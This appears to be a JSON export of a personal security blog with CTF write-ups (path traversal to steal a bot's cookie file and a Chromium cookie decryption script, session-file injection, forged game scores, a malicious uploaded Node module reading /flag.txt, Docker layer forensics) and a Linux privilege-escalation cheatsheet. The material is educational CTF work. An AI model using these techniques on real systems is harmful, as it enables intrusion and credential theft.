
[{"content":"Hello there !\n","date":"4 March 2025","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":"A small talk of ~20 min covering the CVE mapping problem over microsoft products given at Securimag (cybersecurity association of the Grenoble Alps University). It mainly talks about the problem itself and gives insight on how to find a solution. We also cover some tools that also want to have a solution on this problem. This talk is a part of some research I did on the this question but it never leads on any perfect solution. I do not pretend owning the right method to do so.\nðŸ“¥ Slides availables here\n","date":"1 March 2025","externalUrl":null,"permalink":"/talk/keeping-track-of-cves-in-microsoft-products/","section":"Talks and presentations","summary":"","title":"Keeping Track (at least trying to) of CVEs in Microsoft Products - talk given during a Securimag session","type":"section"},{"content":"","date":"1 March 2025","externalUrl":null,"permalink":"/talk/","section":"Talks and presentations","summary":"","title":"Talks and presentations","type":"section"},{"content":"Category : Web Difficulty : Medium\nHackTheBot 1 # Behavior of the web app # The web application is simply based on 2 pages. The first on is static and displays a cheatsheet of payloads to execute multiple web application attacks. The second pages is the /report page where it is possible to give an url as a user input via a POST HTTP request. The website seems to visit the url we passed as input. It is possible to view the logs generated during the request to the input url after submitting it.\nViewing the source # Each POST HTTP request, the following code will be executed.\napp.post(\u0026#39;/report\u0026#39;, (req, res) =\u0026gt; { const url = req.body.url; const name = format(new Date(), \u0026#34;yyMMdd_HHmmss\u0026#34;); startBot(url, name); res.status(200).send(`logs/${name}.log`); }); We can observe that startbot() function is called for each POST HTTP request on /report taking as arguments the url and the date.\nIf we dig into the startbot() function, we can see that she initialize a puppeteer headless browser to visit this page. During this initialization, a browser cache folder is given to the bot as argument too.\nconst browser = await puppeteer.launch({ headless: \u0026#39;new\u0026#39;, args: [\u0026#39;--remote-allow-origins=*\u0026#39;,\u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-dev-shm-usage\u0026#39;, `--user-data-dir=${browserCachePath}`] }); The browser cache path has the following value. We also can see the logPath where the logs can be accessed.\nconst logPath = \u0026#39;/tmp/bot_folder/logs/\u0026#39;; const browserCachePath = \u0026#39;/tmp/bot_folder/browser_cache/\u0026#39;; After the initialization, the bot will visit the url, and will add the flag as a cookie if the url is starting with http://localhost/ (and will not otherwise).\nconst cookie = { name: \u0026#39;Flag\u0026#39;, value: \u0026#34;PWNME{FAKE_FLAG}\u0026#34;, sameSite: \u0026#39;Strict\u0026#39; }; //[...] if (url.startsWith(\u0026#34;http://localhost/\u0026#34;)) { await page.setCookie(cookie); } Exploit # In the source, we can also observe that there is the nginx.conf file.\nhttp { server { listen 80; location / { proxy_pass http://127.0.0.1:5000; } location /logs { autoindex off; alias /tmp/bot_folder/logs/; try_files $uri $uri/ =404; } } } It specifies the aliases entries to access folders on the machine. Here we can see that /tmp/bot_folder/logs/ has the aliases /logs. This configuration is vulnerable to the Off-By-Slash vulnerability that allows you to perform a path trasversal vulnerbility. That means we can access to the browser_cache folder.\nWith some google research, we can easily find out that puppeteer stores the cookies information in the /browser_cache/Default/Cookies file when he uses Chromium browsers. Hence we can download this file directly doing a GET HTTP request over the followinf url : http://\u0026lt;PwnMeCtfEndpoint\u0026gt;/logs../browser_cache/Default/Cookies.\nThis Cookies file, is a SQLite database file containing a lot information, and espacially the encrypted_value.\nSQLite version 3.40.1 2022-12-28 14:03:47 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; PRAGMA table_info(cookies); 0|creation_utc|INTEGER|1||0 1|host_key|TEXT|1||0 2|top_frame_site_key|TEXT|1||0 3|name|TEXT|1||0 4|value|TEXT|1||0 5|encrypted_value|BLOB|1||0 6|path|TEXT|1||0 7|expires_utc|INTEGER|1||0 8|is_secure|INTEGER|1||0 9|is_httponly|INTEGER|1||0 10|last_access_utc|INTEGER|1||0 11|has_expires|INTEGER|1||0 12|is_persistent|INTEGER|1||0 13|priority|INTEGER|1||0 14|samesite|INTEGER|1||0 15|source_scheme|INTEGER|1||0 16|source_port|INTEGER|1||0 17|last_update_utc|INTEGER|1||0 18|source_type|INTEGER|1||0 19|has_cross_site_ancestor|INTEGER|1||0 ... sqlite\u0026gt; select * from cookies; 13385310290141341|localhost||Flag||v10ï¿½(mz\u0026amp;ï¿½ï¿½ï¿½ï¿½#[ï¿½ï¿½YHï¿½)$\u0026#34;ï¿½ï¿½ï¿½ï¿½9ï¿½mzï¿½|/|0|0|0|0|0|0|1|2|1|80|13385310290141197|3|1 Then we need to decrypt this value. Again, some google search, leads us to use the Local State file of the cache folder. Since he does not contain any key, we will use default credentials. Thanks to @Sacre who found this script here https://stackoverflow.com/questions/23153159/decrypting-chromium-cookies, we were able to decrypt the cookie encrypted value.\n# Exemple de bytes donnÃ©s #! /usr/bin/env python3 from Crypto.Cipher import AES from Crypto.Protocol.KDF import PBKDF2 # Function to get rid of padding def clean(x): return x[:-x[-1]].decode(\u0026#39;utf8\u0026#39;) # replace with your encrypted_value from sqlite3 encrypted_value = b\u0026#34;v10\\xe3\\xbe\\x1f(mz\u0026amp;\\x18\\x9b\\xa6\\x19\\xc9\\xc1#[\\xdd\\xddYH\\xfa)$\\\u0026#34;\\xe4\\xdd\\xf5\\x899\\x8cmz\\xa7\u0026#34; # Trim off the \u0026#39;v10\u0026#39; that Chrome/ium prepends encrypted_value = encrypted_value[3:] # Default values used by both Chrome and Chromium in OSX and Linux salt = b\u0026#39;saltysalt\u0026#39; iv = b\u0026#39; \u0026#39; * 16 length = 16 # On Mac, replace MY_PASS with your password from Keychain # On Linux, replace MY_PASS with \u0026#39;peanuts\u0026#39; my_pass = \u0026#39;peanuts\u0026#39; my_pass = my_pass.encode(\u0026#39;utf8\u0026#39;) # 1003 on Mac, 1 on Linux iterations = 1 key = PBKDF2(my_pass, salt, length, iterations) cipher = AES.new(key, AES.MODE_CBC, IV=iv) decrypted = cipher.decrypt(encrypted_value) print(clean(decrypted)) Running this will help us to get the flag : PWNME{D1d_y0U_S4iD-F1lt33Rs?}\n","date":"28 February 2025","externalUrl":null,"permalink":"/wu/pwnme-ctf-2025/","section":"Write ups","summary":"","title":"PwnMe ctf 2025 write-up : HackTheBot","type":"articles"},{"content":" Linux LPE to-do list # List Users # cat /etc/passwd Check Exploits for the Running Linux Kernel Version # uname -a # full kernel info uname -r # just the version Check Special Groups That May Allow Privileged Command Execution # groups For example, if the user is part of the docker group, it may be possible to mount a Docker container on the root filesystem: https://www.hackingarticles.in/docker-privilege-escalation/\ndocker run -it -v /root:/mnt alpine # or another image Check Environment Variables # printenv Find Executables with sudo Privileges # sudo -l https://gtfobins.github.io\nIf you are dealing with a custom script:\nExploit password pattern matching: https://mywiki.wooledge.org/BashPitfalls#if_.5B.5B_.24foo_.3D_.24bar_.5D.5D_.28depending_on_intent.29\nMonitor executed commands (pspy) and look for plaintext credentials in commands: https://github.com/DominicBreuker/pspy\nCheck Running Services / Timers # Check ports exposed only on localhost: ./linpeas ss -tlnp ps -aux # process listing List active services and timers: systemctl list-units --type service/timer --state running Print detailed information about a specific service or timer (unit): systemctl cat custom.service Get the status of a service: systemctl status apache2 Local port forwarding with SSH\nLocal port forwarding with Chisel\nMonitor cron jobs / find plaintext credentials in cron commands: https://github.com/DominicBreuker/pspy\nCheck Suspicious Files # Find files owned by the current user (excluding /run, /proc, etc.): find / -user \u0026lt;USER\u0026gt; 2\u0026gt;/dev/null | grep -v \u0026#39;^/run\\|^/proc\\|^/sys\\\u0026#39; Search in common directories: /opt /var /tmp /mail (others?)\nSearch for files by name: find / -iname *\u0026lt;PATTERN\u0026gt;* 2\u0026gt;/dev/null Check Files with SUID Bit Set (Owned by Root) (Reported by linpeas) # Pay special attention to binary files on the system. Some may be vulnerable to Local Privilege Escalation (LPE) exploits!\nCapabilities (Reported by linpeas) # https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities\nNon-Exhaustive List of Additional Checks # â–  Check if dangerous binaries have the SUID/SGID attribute (linpeas) â–  List files not owned by me but where I have write permissions â–  Check if critical packages (sudo, polkit, etc.) are outdated\n","date":"17 February 2025","externalUrl":null,"permalink":"/talk/cheatsheet-lpe-linux-to-be-completed/","section":"Talks and presentations","summary":"","title":"Cheatsheet LPE Linux (to be completed)","type":"section"},{"content":" New new .. always new # We first land on a page that provides the application code. Let\u0026rsquo;s download it and read it. The application is quite simple :\nOne register route which create and store an user : email = request.json.get(\u0026#39;email\u0026#39;) name = request.json.get(\u0026#39;name\u0026#39;) password = request.json.get(\u0026#39;password\u0026#39;) password_hash = generate_password_hash(password) user = User(email=email, name=name, role=\u0026#39;user\u0026#39;, password_hash=password_hash) db.session.add(user) db.session.commit() One login route that checks if the user exists and creates and creates a session cookie using an uuidV4 email = request.json.get(\u0026#39;email\u0026#39;) password = request.json.get(\u0026#39;password\u0026#39;) user = User.query.filter_by(email=email).first() if user and check_password_hash(user.password_hash, password): session_id = create_session(user.email, user.name, user.role) response = make_response(jsonify(success=\u0026#34;Logged in successfully\u0026#34;)) response.set_cookie(\u0026#39;session_id\u0026#39;, session_id) return response The create_session method is used to create a file storing informations about the current user named session_{uuid}.conf.\ndef create_session(email, name, role): session_id = str(uuid.uuid4()) session_file = os.path.join(SESSION_DIR, f\u0026#39;session_{session_id}.conf\u0026#39;) with open(session_file, \u0026#39;w\u0026#39;) as f: f.write(f\u0026#39;email={email}\\n\u0026#39;) f.write(f\u0026#39;role={role}\\n\u0026#39;) f.write(f\u0026#39;name={name}\\n\u0026#39;) return session_id The admin route that check the file created before during the create_session method and read the role to ensure that only the admin is accessing the file. Here is the load_session method that read properties written in the local file : session_data = {} with open(session_file, \u0026#39;r\u0026#39;) as f: for line in f: key, value = line.strip().split(\u0026#39;=\u0026#39;) session_data[key] = value Vulnerability : # In this function, every single line is read. The goal is to overwrite the \u0026lsquo;role\u0026rsquo; of the user (mass assignment) via an \u0026ldquo;injection of properties\u0026rdquo;. To do so, we need to create a user with the following request :\nSince we already know that the name is written after the role in the file, the configuration file should like this\nemail=user@test.com role=user name=user role=admin Then, when the load_session function is called, the role will first be set to \u0026lsquo;user\u0026rsquo; and then set to \u0026lsquo;admin\u0026rsquo;.\nNow you just need to access to the /admin route and read the flag :\nRM{I_Thought_Th1s_VUlnerab1ility_W4s_N0t_Imp0rtant}\n","date":"30 December 2024","externalUrl":null,"permalink":"/wu/root-me-xmas-2024/new-new-..-always-new-day-15/","section":"Write ups","summary":"","title":"Root-me Xmas fifteenth day : New new .. always new","type":"articles"},{"content":" Santa\u0026rsquo;s magick sack # Le site propose un jeu interractif ou le but est d\u0026rsquo;amasser le plus de point en attrapant les cadeaux qui tombe. Le but du jeu est de battre le jouer \u0026ldquo;Santa\u0026rdquo; qui a un score de \u0026hellip; points.\nBien Ã©videmment c\u0026rsquo;est impossible sans tricher !\nL\u0026rsquo;application fonctionne avec du javascript local. A la fin du jeu, l\u0026rsquo;application envoie une requÃªte Ã  l\u0026rsquo;endpoint /score Ã  l\u0026rsquo;aide d\u0026rsquo;une requÃªte POST :\nA premiÃ¨re vu, la chaine semblait Ãªtre encodÃ©e en base64 mais celle-ci n\u0026rsquo;est pas lisible lorsqu\u0026rsquo;on la dÃ©code. Allons du cÃ´tÃ© de code source JavaScript quand la requÃªte est envoyÃ©e :\nvar Md = hf.exports; const gf = Rf(Md), Ud = \u0026#34;S4NT4_S3CR3T_K3Y_T0_ENCRYPT_DATA\u0026#34;; function Wd(e) { const t = JSON.stringify(e); return gf.AES.encrypt(t, Ud).toString() } function $d(e, t) { const r = Math.floor(Math.random() * 9) + 1, n = `${e}-${t}-${r}`; return { checksum: gf.SHA256(n).toString(), salt: r } } async function Vd(e, t) { const { checksum: r, salt: n } = $d(e, t), l = Wd({ playerName: e, score: t, checksum: r, salt: n }); try { return await ( await fetch(\u0026#34;/api/scores\u0026#34;, { method: \u0026#34;POST\u0026#34;, headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34; }, body: JSON.stringify({ data: l }) })).json() } catch (i) { return console.error(\u0026#34;Error submitting score:\u0026#34;, i), { success: !1 } } } Dans l\u0026rsquo;application, le payload est donc envoyÃ© sous cette forme :\n{ playerName: \u0026#39;sidorocs\u0026#39;, score: 150, checksum: \u0026#39;728282e9a412663db774ffd0ca82877f03449c6ff84781b685a7c58de862e4c0\u0026#39;, salt: 3 } et chiffrÃ© avec AES 256 grÃ¢ce Ã  la clÃ© S4NT4_S3CR3T_K3Y_T0_ENCRYPT_DATA.\nDe plus, la somme de contrÃ´le n\u0026rsquo;est ni plus ni moins que le hash SHA256 de la chaine de charactÃ¨re suivante :\n`${playerName}-${score}-${randomSalt}` En sachant tout Ã§a, il est possible de rejouer le code de gÃ©nÃ©ration du payload en changeant le score et enfin de rejouer la requÃªte POST qui envoie le score au backend de l\u0026rsquo;application :\nAnd here\u0026rsquo;s the flag :) RM{S4NT4_H0PE_Y0U_D1DN'T_CHEAT}\n","date":"30 December 2024","externalUrl":null,"permalink":"/wu/root-me-xmas-2024/santas-magick-sack-day-3/","section":"Write ups","summary":"","title":"(French) Root-me Xmas third day : Santa's Magick Sack","type":"articles"},{"content":"","date":"30 December 2024","externalUrl":null,"permalink":"/wu/root-me-xmas-2024/","section":"Write ups","summary":"","title":"Root-me Xmas advent calendar write-up : 1st, 3rd, and 15th day","type":"articles"},{"content":" Generous santa # Le site propose deux fonctions :\nAjouter des cadeaux Ã  sa liste de noÃ«l parmi la liste proposÃ©e SuggÃ©rer une idÃ©e de cadeau Ã  ajouter dans la liste Deux fonctions sont proposÃ©es sur le site de commande de cadeaux et qu\u0026rsquo;on peut retrouver dans le code source en tant que fonction backend\n/api/suggest\nconst now = new Date(); const dateStr = now.toISOString().split(\u0026#39;T\u0026#39;)[0]; const timeStr = `${now.getHours()}-${now.getMinutes()}-${now.getSeconds()}`; const tempDir = path.join(\u0026#39;/tmp\u0026#39;, `${dateStr}_${timeStr}`); fs.mkdirSync(tempDir, { recursive: true }); const tempPath = path.join(tempDir, req.file.originalname); fs.writeFile(tempPath, req.file.buffer, (err) =\u0026gt; { if (err) { return res.status(500).json({ message: `Error saving the image: ${err.message}` }); } res.json({ message: `Thank you! Santa will consider your suggestion.`, photoPath: tempPath }); }); Qui permet de renseigner un nom de produit au pÃ¨re noÃ«l et d\u0026rsquo;uploader une photo du produit dans le rÃ©pertoire /tmp/\u0026lsquo;date\u0026rsquo;/\u0026lsquo;filename\u0026rsquo;/\n/api/add\nconst Gift = require(`../models/${product.toLowerCase()}`); const gift = new Gift({ name: product, description: `Description of ${product}` }); output = gift.store(); res.json({ success: true, output: output }); Le code appel un template javascript dans le sous-rÃ©pertoire \u0026lsquo;app path\u0026rsquo;/models/\u0026lsquo;product name\u0026rsquo;.\nEn jouant un peu avec la fonction d\u0026rsquo;upload, on se rend compte qu\u0026rsquo;il n\u0026rsquo;y a aucune restriction sur le type de fichier qu\u0026rsquo;on peut upload.\nEn ayant inspectant les requÃªtes, on remarque que /api/add renvoie un message de succÃ¨s plusieurs champs. On va s\u0026rsquo;en servir pour exfiltrer le contenu du flag.\nEn Ã©crivant un module personnalisÃ©, et en l\u0026rsquo;uploadant :\nconst fs = require(\u0026#39;fs\u0026#39;); class Gift { constructor({ name = \u0026#39;Default Gift\u0026#39;, description = \u0026#39;Default Description\u0026#39; } = {}) { this.name = name; this.description = description; } store() { try { const flagContent = fs.readFileSync(\u0026#39;/flag.txt\u0026#39;, \u0026#39;utf8\u0026#39;); return `${flagContent}`; } catch (err) { console.error(\u0026#39;Erreur lors de la lecture de /flag.txt :\u0026#39;, err.message); } return \u0026#34;Une erreur est survenue lors de la lecture du flag :/\u0026#34;; } } module.exports = Gift; Il est possible d\u0026rsquo;Ã©xecuter le code Ã  l\u0026rsquo;aide de cette requÃªte :\nHere\u0026rsquo;s the flag :) RM{Mayb3_S4nt4_Cl4uS_Als0_G3t_A_Flag}\n","date":"30 December 2024","externalUrl":null,"permalink":"/wu/root-me-xmas-2024/generous-santa-day-1/","section":"Write ups","summary":"","title":"(French) Root-me Xmas first day : Generous Santa","type":"articles"},{"content":"Hello there,\nI\u0026rsquo;m Mathieu (sometimes known as Sidorocs on social media), and I\u0026rsquo;m 22 years old. I\u0026rsquo;ve recently graduated from the University of Grenoble Alpes, where I completed a Master\u0026rsquo;s degree in \u0026ldquo;Cybersecurity and Legal Informatics.\u0026rdquo;\nI started learning cybersecurity a little over a year and a half ago, and Iâ€™ve become deeply passionate about it. I spend most of my time developing new skills on CTF platforms such as Root-Me and Hack The Box (mainly). I also participate in CTFs, usually on my own, and occasionally create challenges! I\u0026rsquo;m still actively involved in the organization of Securimag (the university\u0026rsquo;s infosec association), where I give talks and help organize CTFs.\nOn this website, you\u0026rsquo;ll find links to my social media and CTF platforms, write-ups for the challenges I\u0026rsquo;ve created, and presentations from my talks.\n","date":"17 November 2024","externalUrl":null,"permalink":"/aboutme/","section":"About me","summary":"","title":"About me","type":"section"},{"content":"As suggested in the challenge description and the source script, the shares.txt file contains a set of shares constructed using Shamir\u0026rsquo;s secret sharing scheme. However, a subtlety lay in the encoding of the secret.\nIndeed, Shamir\u0026rsquo;s secret sharing usually proceeds as follows:\nWe define the following parameters:\nN -\u0026gt; the number of shares k -\u0026gt; a threshold such that k-1 shares are sufficient to reconstruct the secret To generate the shares: We take N distinct points and evaluate the following polynomial for each point:\ns + a_1 * x + a_2 * x^2 + ... + a_k * x^k\nwhere a_i for i from 1 to k are randomly chosen numbers.\nTo recover the secret, we only need k-1 shares to reconstruct the initial polynomial and evaluate it at 0 to recover the secret s.\nIn our case, the degree-0 coefficient is a linear combination of the secret and the a_i\u0026rsquo;s and is specified by the following \u0026rsquo;target vector\u0026rsquo;: [1, 2, 1, 0, 0] This means that the degree-0 coefficient is composed of s + 2 * a_1 + a_2.\nTo recover the secret, we just needed to find the polynomial coefficients and compute the dot product with the target vector:\ndef recover_secret(shares, target_vector, prime=_PRIME): \u0026#34;\u0026#34;\u0026#34; Recover the secret from share points (points (x,y) on the polynomial). \u0026#34;\u0026#34;\u0026#34; if len(shares) \u0026lt; k: raise ValueError(\u0026#34;need at least k shares\u0026#34;) x_s, y_s = zip(*shares) coeffs = lagrange_interpolation_coeffs(x_s, y_s, prime) secret = dot_product(coeffs, target_vector, prime) return number.long_to_bytes(secret) The full solution is available in the solution.py file.\nBy running the script, you will obtain the following output: Recovered secret GH{t4rg3t_v3ct0r_c4n_b3_tr1cky}\n","date":"17 November 2024","externalUrl":null,"permalink":"/wu/gh2024-hide-and-share/","section":"Write ups","summary":"","title":"Grehack 2024 ctf write-up : Hide and Share","type":"articles"},{"content":"","date":"17 November 2024","externalUrl":null,"permalink":"/wu/","section":"Write ups","summary":"","title":"Write ups","type":"section"},{"content":"A talk covering the fundamental aspects of how secret sharing schemes work. We primarily explore the connection between Shamir\u0026rsquo;s secret sharing scheme and linear codes, such as Reed-Solomon codes. Finally, we delve into a more complex topic: how to construct such schemes for any abelian group. These types of schemes are often referred to as Black Box Secret Sharing Schemes.\nSlides available here :\nðŸ“¥ Visualize the slides here\n","date":"17 November 2024","externalUrl":null,"permalink":"/talk/introduction-to-secret-sharing-schemes/","section":"Talks and presentations","summary":"","title":"How to share a secret - talk given during a Securimag session","type":"section"},{"content":" docker layer write up # You first need to pull all the images :\ndocker pull anssi/fcsc2024-forensics-layer-cake-1 docker pull anssi/fcsc2024-forensics-layer-cake-2 docker pull anssi/fcsc2024-forensics-layer-cake-3 If you type :\ndocker images ... anssi/fcsc2024-forensics-layer-cake-1 latest 0faa62781dd1 9 months ago 7.38MB you\u0026rsquo;ll be able to see all the images you pulled.\nFirst layer cake # In docker, layers are the instructions of the Dockerfile used to build the image (they are usually file system changes etc.). You can easily find this layers by processing the command\ndocker hystory anssi/fcsc2024-forensics-layer-cake-1 --no-trunc IMAGE CREATED CREATED BY SIZE COMMENT sha256:0faa62781dd1db0ebb6cd83836bb4ba24f8b58b0cd761ac0cbae426bccc7666f 1 months ago CMD [\u0026#34;/bin/sh\u0026#34;] 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 1 months ago USER guest 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 1 months ago ARG FIRST_FLAG=FCSC{a1240d90ebeed7c6c422969ee52xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx} 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 1 months ago /bin/sh -c #(nop) CMD [\u0026#34;/bin/sh\u0026#34;] 0B \u0026lt;missing\u0026gt; 1 months ago /bin/sh -c #(nop) ADD file:37a76ec18f9887751cd8473744917d08b7431fc4085097bb6a09d81b41775473 in / 7.38MB so here\u0026rsquo;s our first flag :) !\nSecond layer cake # If you retry the same command as in the first challenge, you\u0026rsquo;ll see something close to that :\nIMAGE CREATED CREATED BY SIZE COMMENT sha256:03014d9fc4801b1810b112fd53e05e35ea127e55c82d1304b5622cfe257c0ad8 1 months ago CMD [\u0026#34;/bin/sh\u0026#34;] 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 1 months ago USER guest 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 1 months ago RUN /bin/sh -c rm /tmp/secret # buildkit 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 1 months ago COPY secret /tmp # buildkit 71B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 1 months ago /bin/sh -c #(nop) CMD [\u0026#34;/bin/sh\u0026#34;] 0B \u0026lt;missing\u0026gt; 1 months ago /bin/sh -c #(nop) ADD file:37a76ec18f9887751cd8473744917d08b7431fc4085097bb6a09d81b41775473 in / 7.38MB As we can see, a secret has been copied in the /tmp folder but we can\u0026rsquo;t access it only with this command. No we will need to \u0026ldquo;dive\u0026rdquo; further into the file system of each layer. To do so, we can use the tool dive :\nAs we can see, we can navigate through the layers of the image consulting the structure of the file system. From here, we can see that a file named secret has been placed into the /tmp folder.\nNow the goal is to extract that file ! Let us inspect the image with docker inspect. The interesting field is GraphDriver.Data.LowerDir which list the folder containing the difference of the file system of all older layers.\nSeeing this :\n\u0026#34;Data\u0026#34;: { \u0026#34;LowerDir\u0026#34;: \u0026#34;/var/lib/docker/overlay2/643b1a02362f1cef26f01cc94c3b9a0ee5fb8b429ce3b1511194b9cf0a7bd1b2/diff:/var/lib/docker/overlay2/fbbfa9fff3f5a67da15ef066aa4c83066a02ddebab95de67c6b47bddf2fe05d3/diff\u0026#34;, we can deduce that the file system difference is located in the `` folder, and cat the secret :\nroot@MathieuDebian:/var/lib/docker/overlay2/643b1a02362f1cef26f01cc94c3b9a0ee5fb8b429ce3b1511194b9cf0a7bd1b2/diff/tmp# pwd /var/lib/docker/overlay2/643b1a02362f1cef26f01cc94c3b9a0ee5fb8b429ce3b1511194b9cf0a7bd1b2/diff/tmp root@MathieuDebian:/var/lib/docker/overlay2/643b1a02362f1cef26f01cc94c3b9a0ee5fb8b429ce3b1511194b9cf0a7bd1b2/diff/tmp# cat secret FCSC{b38095916b2b578109cbf35b8be713b04a64b2b2dxxxxxxxxxxxxxxxxxxxxxxxx} Here\u0026rsquo;s the second flag !\nthird layer cake # Again, let\u0026rsquo;s pull and inspect our image. We can see this line indicating the folder where all the data related to the docker image is stored.\n\u0026#34;UpperDir\u0026#34;: \u0026#34;/var/lib/docker/overlay2/eea95c7208f138a8c449ecbbfc64874d130f20e8a3239a389aaa69c4df797974/diff\u0026#34; let\u0026rsquo;s get into this folder and execute the command\nroot@MathieuDebian:/var/lib/docker/overlay2/eea95c7208f138a8c449ecbbfc64874d130f20e8a3239a389aaa69c4df797974/diff# grep -r FCSC{ nix/store/m8ww0n3iqndg8zaiwbsnij6rvmpmjbry-hello/bin/hello:exec /nix/store/rnxji3jf6fb0nx2v0svdqpj9ml53gyqh-hello-2.12.1/bin/hello -g \u0026#34;FCSC{c12d9a48f1635354fe9c32b216f144ac66f7b8466a5ac82a35aa385964ccbb61}\u0026#34; -t Once again, here\u0026rsquo;s the flag !\n","date":"20 February 2024","externalUrl":null,"permalink":"/wu/fscs2024-layer-cake1-2-3/","section":"Write ups","summary":"","title":"FCSC 2024 : write for the challenges layer cake 1, 2 and 3","type":"section"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]